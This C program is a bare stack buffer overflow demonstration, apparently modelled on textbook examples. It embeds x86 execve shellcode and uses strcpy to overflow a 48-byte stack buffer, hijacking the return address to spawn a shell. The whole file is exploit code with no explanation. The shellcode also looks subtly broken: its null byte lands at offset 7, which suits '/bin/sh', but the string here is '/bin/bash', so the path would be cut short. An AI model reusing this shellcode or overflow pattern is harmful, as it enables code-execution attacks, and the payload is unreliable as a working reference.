  #include <stdio.h>
  #include <string.h>

  // without zeros 
 char shellcode[] = 
 "\xeb\x18\x5e\x31\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/bash         ";

 char large_string[128];

 void main(){
	char buffer[48];
	int i;
	long *long_ptr = (long *) large_string;

	for(i=0; i < 32; ++i) // 128/4 = 32
		long_ptr[i] = (int) buffer;

	for(i=0; i < strlen(shellcode); i++){
		large_string[i]  = shellcode[i];
	}

	strcpy(buffer, large_string);
 }
